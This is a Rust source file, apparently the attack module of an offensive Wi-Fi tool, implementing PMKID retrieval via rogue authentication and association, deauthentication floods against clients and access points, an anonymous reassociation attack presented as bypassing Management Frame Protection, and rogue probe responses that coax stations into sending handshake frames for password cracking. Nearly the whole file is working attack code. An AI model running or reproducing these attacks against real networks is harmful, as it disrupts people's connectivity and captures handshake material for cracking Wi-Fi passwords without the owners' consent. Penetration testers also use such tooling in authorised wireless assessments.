// Attack! //

use std::{
    os::fd::AsRawFd,
    time::{Duration, SystemTime},
};

use libwifi::frame::{
    components::{MacAddress, RsnCipherSuite},
    DeauthenticationReason, ProbeRequest,
};
use rand::seq::SliceRandom;

use crate::{
    status::{MessageType, StatusMessage},
    tx::{
        build_association_request_rg, build_authentication_frame_noack,
        build_deauthentication_fm_ap, build_deauthentication_fm_client,
        build_probe_request_undirected, build_probe_response, build_reassociation_request,
    },
    write_packet, OxideRuntime,
};

/// M1 Retrieval Attack Phase 1
/// Authentication
/// Used to (attempt) to retrieve a PMKID.
pub fn m1_retrieval_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<(), String> {
    // get AP object, if there isn't one, return (this shouldn't happen).
    let ap_data = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
        dev
    } else {
        return Ok(());
    };

    ////// Target Validation ////////
    let mut target = true;

    if !oxide.targets.is_empty() || !oxide.stargets.is_empty() {
        target = false;
    }

    if !target && oxide.targets.contains(ap_mac) {
        target = true;
    }

    if !target
        && !oxide.stargets.is_empty()
        && (ap_data.ssid.is_none()
            || (ap_data.ssid.is_some() && oxide.stargets.contains(&ap_data.ssid.clone().unwrap())))
    {
        target = true
    }

    if !target {
        return Ok(());
    }
    /////////////////////////////

    // If we already have a 4whs, don't continue.
    if oxide
        .handshake_storage
        .has_complete_handshake_for_ap(ap_mac)
    {
        return Ok(());
    }

    if ap_data.ssid.is_none() {
        return Ok(());
    }

    // If the interaction cooldown isn't timed out (aka timer1).
    if !ap_data.auth_sequence.is_t1_timeout() {
        return Ok(());
    }

    // At this point we know it has been 5 seconds since we last interacted.

    // Check state of auth sequence to ensure we are in the right order.
    if ap_data.auth_sequence.state > 0 {
        ap_data.auth_sequence.state = 0; // If t1 is timed out, we gotta reset to state 0.
    }

    // If we already have an M1 for this AP, don't re-attack.
    if oxide.handshake_storage.has_m1_for_ap(ap_mac) {
        return Ok(());
    }

    // Ensure the AP uses PSK (from the robust security ie)
    if !ap_data.information.rsn_akm_psk.is_some_and(|psk| psk) {
        return Ok(());
    }

    // Make an authentication frame (no_ack), so we don't over-send.
    // TODO: Probably add some sort of "noise" flag that uses ack (so we send retries when necessary)
    let frx =
        build_authentication_frame_noack(ap_mac, &oxide.rogue_client, oxide.counters.sequence2());

    // If we are transmitting
    if !oxide.notx {
        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
        ap_data.interactions += 1;
        ap_data.auth_sequence.state = 1;
        ap_data.update_t1_timer();
        ap_data.update_t2_timer();
    }

    Ok(())
}

/// This is phase two of M1 Retrieval, specifically processed after we receive an authentication from AP where the station is our rogue mac.
pub fn m1_retrieval_attack_phase_2(
    ap_mac: &MacAddress,
    client_mac: &MacAddress,
    oxide: &mut OxideRuntime,
) -> Result<(), String> {
    // Get our AP
    let ap_data = if let Some(ap) = oxide.access_points.get_device(ap_mac) {
        ap
    } else {
        return Ok(());
    };

    ////// Target Validation ////////
    let mut target = true;

    if !oxide.targets.is_empty() || !oxide.stargets.is_empty() {
        target = false;
    }

    if !target && oxide.targets.contains(ap_mac) {
        target = true;
    }

    if !target
        && !oxide.stargets.is_empty()
        && (ap_data.ssid.is_none()
            || (ap_data.ssid.is_some() && oxide.stargets.contains(&ap_data.ssid.clone().unwrap())))
    {
        target = true
    }

    if !target {
        return Ok(());
    }
    /////////////////////////////

    // Is our sequence state 1?
    if ap_data.auth_sequence.state != 1 {
        return Ok(());
    }

    // It's been more than 5 seconds since our last interaction
    if ap_data.auth_sequence.is_t1_timeout() {
        // Reset state to 0 and update timers.
        if ap_data.auth_sequence.state > 0 {
            ap_data.auth_sequence.state = 0;
            ap_data.update_t2_timer();
            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Info,
                format!("{} state reset to 0.", ap_mac),
            ));
        }
        return Ok(());
    }

    if oxide.handshake_storage.has_m1_for_ap(ap_mac) {
        return Ok(());
    }

    let cs = if ap_data.information.cs_tkip.is_some_and(|f| f) {
        RsnCipherSuite::TKIP
    } else {
        RsnCipherSuite::CCMP
    };
    let gs = if ap_data.information.gs_tkip.is_some_and(|f| f) {
        RsnCipherSuite::TKIP
    } else {
        RsnCipherSuite::CCMP
    };

    let frx: Vec<u8> = build_association_request_rg(
        ap_mac,
        client_mac,
        ap_mac,
        oxide.counters.sequence2(),
        ap_data.ssid.clone(),
        gs,
        vec![cs],
    );

    if !oxide.notx {
        ap_data.auth_sequence.state = 2;
        ap_data.update_t1_timer(); // We interacted
        ap_data.update_t2_timer(); // We changed state

        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
        ap_data.interactions += 1;
    }
    Ok(())
}

pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<(), String> {
    let ap_data = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
        dev
    } else {
        return Ok(());
    };

    let mut target = true;

    if !oxide.targets.is_empty() || !oxide.stargets.is_empty() {
        target = false;
    }

    if !target && oxide.targets.contains(ap_mac) {
        target = true;
    }

    if !target
        && !oxide.stargets.is_empty()
        && (ap_data.ssid.is_none()
            || (ap_data.ssid.is_some() && oxide.stargets.contains(&ap_data.ssid.clone().unwrap())))
    {
        target = true
    }

    if !target {
        return Ok(());
    }

    if oxide
        .handshake_storage
        .has_complete_handshake_for_ap(ap_mac)
    {
        return Ok(());
    }

    if oxide.notx {
        return Ok(());
    }

    let beacon_count = ap_data.beacon_count;
    let mut deauth_client = MacAddress([255, 255, 255, 255, 255, 255]);

    if !ap_data.information.ap_mfp.is_some_and(|mfp| mfp) && ap_data.information.akm_mask() {
        let random_client = ap_data
            .client_list
            .get_random()
            .map(|client| client.mac_address);

        if let Some(mac_address) = random_client {
            // Rate limit directed deauths to every 32 beacons.
            if (beacon_count % 32) == 0 {
                deauth_client = mac_address;
                // Deauth From AP
                let frx = build_deauthentication_fm_ap(
                    ap_mac,
                    &mac_address,
                    oxide.counters.sequence1(),
                    DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
                );
                let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);

                // Deauth From Client
                let frx = build_deauthentication_fm_client(
                    ap_mac,
                    &mac_address,
                    oxide.counters.sequence1(),
                    DeauthenticationReason::DeauthenticatedBecauseSTAIsLeaving,
                );
                let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);

                ap_data.interactions += 1;
                oxide.status_log.add_message(StatusMessage::new(
                    MessageType::Info,
                    format!("Sending Deauth: {} => {}", ap_mac, deauth_client),
                ));
            }
        } else {
            // Rate limit broadcast deauths to every 128 beacons.
            if (beacon_count % 128) == 0 {
                // There is no client
                let frx = build_deauthentication_fm_ap(
                    ap_mac,
                    &MacAddress([255, 255, 255, 255, 255, 255]),
                    oxide.counters.sequence1(),
                    DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
                );
                let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);

                ap_data.interactions += 1;
                oxide.status_log.add_message(StatusMessage::new(
                    MessageType::Info,
                    format!("Sending Deauth: {} => {}", ap_mac, deauth_client),
                ));
            }
        }
    }

    Ok(())
}

//////////////////////////////////////////////////////////////
//                                                          //
//             Anonymous Reasasociation Attack              //
//   An anonmyous reassociaation attack sends an AP a       //
//  reassociation frame with a source address of broadcast. //
//  as a result, some AP's will send a deauthentication     //
//  as a response with "Station attempting reassociation is //
//  not associated" to the broadcast address, resulting in  //
//  deauthentication of all of it's clients. This bypasses  //
//  any Management Frame Protections.                       //
//                                                          //
//////////////////////////////////////////////////////////////

pub fn anon_reassociation_attack(
    oxide: &mut OxideRuntime,
    ap_mac: &MacAddress,
) -> Result<(), String> {
    if oxide
        .handshake_storage
        .has_complete_handshake_for_ap(ap_mac)
        || oxide.notx
    {
        return Ok(());
    }

    let ap = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
        dev
    } else {
        return Ok(());
    };

    ////// Target Validation ////////
    let mut target = true;

    if !oxide.targets.is_empty() || !oxide.stargets.is_empty() {
        target = false;
    }

    if !target && oxide.targets.contains(ap_mac) {
        target = true;
    }

    if !target
        && !oxide.stargets.is_empty()
        && (ap.ssid.is_none()
            || (ap.ssid.is_some() && oxide.stargets.contains(&ap.ssid.clone().unwrap())))
    {
        target = true
    }

    if !target {
        return Ok(());
    }
    /////////////////////////////

    let pcs = if ap.information.cs_ccmp.is_some_and(|x| x) {
        RsnCipherSuite::CCMP
    } else if ap.information.cs_tkip.is_some_and(|x| x) {
        RsnCipherSuite::TKIP
    } else {
        return Ok(());
    };

    let gcs = if ap.information.gs_ccmp.is_some_and(|x| x) {
        RsnCipherSuite::CCMP
    } else if ap.information.gs_tkip.is_some_and(|x| x) {
        RsnCipherSuite::TKIP
    } else {
        return Ok(());
    };

    // Send a (anonymous) reassociation request to the AP
    let frx = build_reassociation_request(
        ap_mac,
        &MacAddress::broadcast(),
        ap.ssid.clone(),
        oxide.counters.sequence3(),
        gcs,
        vec![pcs],
    );
    let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);

    ap.interactions += 1;
    oxide.status_log.add_message(StatusMessage::new(
        MessageType::Info,
        format!("Anonymous Reassociation Attack: {}", ap_mac),
    ));

    Ok(())
}

//////////////////////////////////////////////////////////////
//                                                          //
//                      ROGUE M2 ATTACKS                    //
//  Depending on which type of probe request we see (which  //
//  can be either directed or undirected) we will send a    //
//  probe response that is appropriate in order to attack   //
//  the station and possibly elicit a M2, which while this  //
//  may contain the incorrect password, it is still likely  //
//  valid and a suitable attack vector.                     //
//                                                          //
//////////////////////////////////////////////////////////////

// Our definition of "directed" is that it is sending a probe-request to a specific AP mac.
pub fn rogue_m2_attack_directed(
    oxide: &mut OxideRuntime,
    probe: ProbeRequest,
) -> Result<(), String> {
    // make sure TX is enabled
    if oxide.notx {
        return Ok(());
    }

    // Grab the station from our unnasoc. clients list.
    let station = if let Some(dev) = oxide.unassoc_clients.get_device(&probe.header.address_2) {
        dev
    } else {
        return Ok(());
    };

    // Make sure we have an SSID to send
    if probe.station_info.ssid.is_none() {
        return Ok(());
    }
    let ssid = probe.station_info.ssid.unwrap();

    let ap = oxide.access_points.get_device_by_ssid(&ssid);

    ////// Target Validation ////////
    let mut target = true;

    if !oxide.targets.is_empty() || !oxide.stargets.is_empty() {
        target = false;
    }

    if !target
        && !oxide.targets.is_empty()
        && ap.is_some_and(|ap| oxide.targets.contains(&ap.mac_address))
    {
        target = true;
    }

    if !target && !oxide.stargets.is_empty() && (oxide.stargets.contains(&ssid)) {
        target = true
    }

    if !target {
        return Ok(());
    }
    /////////////////////////////

    if station.timer_interact.elapsed().unwrap() < Duration::from_secs(3) {
        return Ok(());
    }

    // If we have an AP for this SSID, we will use as many of the same details as possible
    if let Some(ap) = oxide.access_points.get_device_by_ssid(&ssid) {
        // Make sure this AP is a target and that this AP is
        if (!oxide.targets.is_empty() && !oxide.targets.contains(&ap.mac_address))
            || oxide
                .handshake_storage
                .has_complete_handshake_for_ap(&ap.mac_address)
            || oxide.notx
        {
            return Ok(());
        }

        let frx = build_probe_response(
            &probe.header.address_2,
            &probe.header.address_1,
            &ssid,
            oxide.counters.sequence3(),
            oxide.current_channel.get_channel_number(),
        );
        write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
        station.interactions += 1;
        station.timer_interact = SystemTime::now();
        oxide.status_log.add_message(StatusMessage::new(
            MessageType::Info,
            format!("Direct Rogue AP Attack: {} ({})", station.mac_address, ssid),
        ));
    } else {
        return Ok(());
    };

    Ok(())
}

// Our definition of "undirected" is that it is sending a probe-request to broadcast.
pub fn rogue_m2_attack_undirected(
    oxide: &mut OxideRuntime,
    probe: ProbeRequest,
) -> Result<(), String> {
    // make sure TX is enabled
    if oxide.notx {
        return Ok(());
    }

    // Grab the station from our unnasoc. clients list.
    let station = if let Some(dev) = oxide.unassoc_clients.get_device(&probe.header.address_2) {
        dev
    } else {
        return Ok(());
    };

    // Dont over-transmit
    if station.timer_interact.elapsed().unwrap() < Duration::from_secs(3) {
        return Ok(());
    }

    if let Some(ssid) = probe.station_info.ssid {
        // Target validation stuff
        let mut is_target = true;

        if !oxide.targets.is_empty() || !oxide.stargets.is_empty() {
            is_target = false;
        }

        // Is the AP the SSID belongs to (based on our survey) in our MAC Targets?
        if !is_target
            && oxide
                .access_points
                .get_device_by_ssid(&ssid)
                .is_some_and(|ap| oxide.targets.contains(&ap.mac_address))
        {
            is_target = true;
        }

        // Is the SSID in our stargets?
        if !is_target && oxide.stargets.contains(&ssid) {
            is_target = true;
        }

        // Both checks fail, we shouldn't persue this.
        if !is_target {
            return Ok(());
        }

        // Do we already have a rogue-M2 from this station (for this SSID)
        if station.rogue_actions.get(&ssid).is_some_and(|f| *f) {
            return Ok(());
        }

        let frx = build_probe_response(
            &probe.header.address_2,
            &oxide.rogue_client,
            &ssid,
            oxide.counters.sequence3(),
            oxide.current_channel.get_channel_number(),
        );
        write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
        station.interactions += 1;
        station.timer_interact = SystemTime::now();
        oxide.status_log.add_message(StatusMessage::new(
            MessageType::Info,
            format!(
                "Indirect Rogue AP Attack: {} ({})",
                station.mac_address, ssid
            ),
        ));
    } else {
        // We don't want to nest this...
        if !oxide.stargets.is_empty() {
            // Pick a random SSID from our targets and respond.
            let target = &oxide
                .stargets
                .choose(&mut rand::thread_rng())
                .unwrap_or(return Ok(()));

            let frx = build_probe_response(
                &probe.header.address_2,
                &oxide.rogue_client,
                target,
                oxide.counters.sequence3(),
                oxide.current_channel.get_channel_number(),
            );
            write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
            station.interactions += 1;
            station.timer_interact = SystemTime::now();
            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Info,
                format!(
                    "Anonymous Rogue AP Attempt: {} ({})",
                    station.mac_address, target
                ),
            ));
        }
    }

    Ok(())
}
